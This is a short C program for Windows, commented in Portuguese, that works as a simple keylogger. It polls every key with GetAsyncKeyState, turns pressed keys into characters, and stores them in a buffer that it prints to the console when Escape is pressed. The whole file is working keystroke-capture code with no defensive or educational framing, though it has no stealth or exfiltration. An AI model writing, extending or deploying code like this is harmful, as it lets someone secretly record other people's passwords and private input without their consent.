#include <stdio.h>
#include <windows.h>

#define BUFFER_SIZE 4096
#define INTERVALO 60

int main() {
    short keyState;
    char buffer[BUFFER_SIZE] = {0};
     size_t len = 0;

    while (1) {
        // Loop através das teclas
        for (int key = 8; key <= 255; key++) {
            keyState = GetAsyncKeyState(key);

            // Verifica se a tecla foi pressionada
            if (keyState & 0x0001) {
                if(len < BUFFER_SIZE -1){

                 if (key == VK_ESCAPE) {
                    for (size_t i = 0; i < len; i++) {
                 printf("%c", buffer[i]);
                     printf("\n");
                        }
                        printf("Len: %d",len);
                    return 0;
                }
                

                if (key >= 'A' && key <= 'Z') {
                    
                    buffer[len++] = MapVirtualKey(key, MAPVK_VK_TO_CHAR);
                    buffer[len] = '\0';

                } 
                
                else {
                    switch (key) {
                        case VK_SPACE:
                            buffer[len++] = ' ';
                            buffer[len] = '\0';
                            break;
                        case VK_RETURN:
                            buffer[len++] ='\n';
                            buffer[len] = '\0';
                            break;
                        case VK_TAB:
                            buffer[len++] = '\t';
                            buffer[len] = '\0';
                            break;
                        default:
                         buffer[len++] = MapVirtualKey(key, MAPVK_VK_TO_CHAR);
                         buffer[len] = '\0';
                           break;
                    }
                }

                }
            }
        }

        Sleep(20); // Evita sobrecarrega da CPU
    }
}
